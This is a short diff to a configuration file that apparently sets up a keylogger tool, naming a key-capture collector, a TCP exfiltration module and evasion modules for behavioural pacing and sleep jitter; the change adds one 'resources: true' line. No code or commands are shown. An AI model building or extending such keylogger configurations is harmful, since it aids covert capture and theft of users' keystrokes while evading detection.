@@ -17,6 +17,8 @@ keylogger: collectors/keylogger_poll
 exfil: exfil/tcp_flush
 arch: arch/keylogger
 
+resources: true
+
 evasion:
   - evasion/behavioral_pacing
   - evasion/sleep_jitter
